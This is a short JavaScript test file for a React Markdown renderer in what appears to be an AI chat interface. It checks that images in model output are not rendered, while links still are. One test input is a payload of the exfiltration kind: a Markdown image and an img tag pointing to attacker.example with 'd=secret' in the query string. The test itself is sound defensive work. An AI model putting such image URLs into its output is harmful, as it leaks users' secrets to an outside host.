import assert from 'node:assert/strict';
import test from 'node:test';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';

import { MarkdownContent } from '../src/pages/desktop/picoclaw/markdown-content.tsx';

const render = (content) => renderToStaticMarkup(createElement(MarkdownContent, { content }));

test('a Markdown image from the model is not fetched', () => {
  const html = render(
    'Done ![screen](https://attacker.example/p?d=secret) and <img src="https://attacker.example/x">'
  );
  assert.ok(!/<img/i.test(html), html);
  assert.ok(!html.includes('attacker.example/p'), html);
  assert.ok(html.includes('[screen]'), html);
});

test('links stay links', () => {
  const html = render('see [docs](https://example.com/docs)');
  assert.match(html, /<a [^>]*href="https:\/\/example\.com\/docs"/);
});
